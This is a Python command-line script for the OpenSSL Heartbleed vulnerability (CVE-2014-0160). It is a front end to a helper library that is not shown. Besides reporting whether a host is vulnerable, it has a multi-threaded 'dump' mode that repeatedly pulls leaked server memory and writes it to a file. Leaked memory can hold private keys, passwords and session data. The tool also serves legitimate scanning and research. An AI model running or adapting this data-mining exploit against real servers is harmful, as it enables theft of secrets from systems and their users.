#!/usr/bin/env python3
"""
OpenSSL Heartbleed (CVE-2014-0160) vulnerability scanner and data miner.
Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
Environment: Python 3
"""
import sys, time, datetime, signal
from optparse import OptionParser
from multiprocessing.dummy import Pool
from hblib import Bleeder, hexdump

options = OptionParser(usage='%prog server [options]', description='Bleed SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-n', '--length', type='int', default=0xFFFF, help='Payload size')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-o', '--output', type='string', default=None, help='File to append data to (default: none)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Use STARTTLS-mode (default: false)')
options.add_option('-d', '--dump', action='store_true', default=False, help='Use dump mode (default: false)')
options.add_option('-t', '--threads', type='int', default=1, help='Threads to use in dump mode (default: 1)')
options.add_option('-l', '--loops', type='int', default=1, help='Number of loops per connect in dump mode (default: 1)')
options.add_option('-u', '--unobtrusive', action='store_true', default=False, help='Dump a single byte only for vulnerable hosts (default: false)')
options.add_option('--smtphost', type='string', default='starttlstest', help='SMTP hostname (default: starttlstest)')
options.add_option('-q', '--quiet', action='store_true', default=False, help='Quiet mode (default: false)')
options.add_option('--timeout', type='float', default=2.5, help='Data timeout in seconds (default: 2.5 sec)')
options.add_option('-v', '--verbose', action='store_true', default=False, help='Verbose (default: false)')

def make_worker(bleeder, output):
  def inner(i):
    while True:
      vulnerable,data = bleeder.bleed()
      if output is not None and data is not None:
        with open(output, 'a+b') as out_file:
          out_file.write(data) 
      if not vulnerable:
        break
  return inner

def main():
  opts, args = options.parse_args()
  if len(args) < 1:
    options.print_help()
    return 2
  bleeder = Bleeder(
      length=opts.length, 
      ip=args[0], 
      port=opts.port, 
      starttls=opts.starttls, 
      loops=opts.loops, 
      verbose=opts.verbose,
      timeout=opts.timeout,
      unobtrusive=opts.unobtrusive,
      smtp_hostname=opts.smtphost)
  if opts.dump:
    signal.signal(signal.SIGINT, lambda s,f: sys.exit())
    pool = Pool(opts.threads)
    for i in range(opts.threads):
      pool.apply_async(make_worker(bleeder, opts.output), [i])
    while True:
      if not opts.quiet:
        print('[%s] Incoming data rate: %d kbps'%(datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S'), bleeder.get_bps()/1024.0))
      time.sleep(10)
    return 0
  else:
    vulnerable, data = bleeder.bleed()
    if vulnerable and data is not None:
      if not opts.quiet and opts.verbose:
        hexdump(data)
      if opts.output is not None:
        if not opts.quiet:
          print('Writing data dump to: %s'%opts.output)
        with open(opts.output, 'wb') as f:
          f.write(data) 
    if not opts.quiet:
      print('%s:%s is %s'%(args[0], opts.port, 'vulnerable' if vulnerable else 'safe'))
    return 0 if vulnerable else 1

if __name__ == '__main__':
  sys.exit(main())
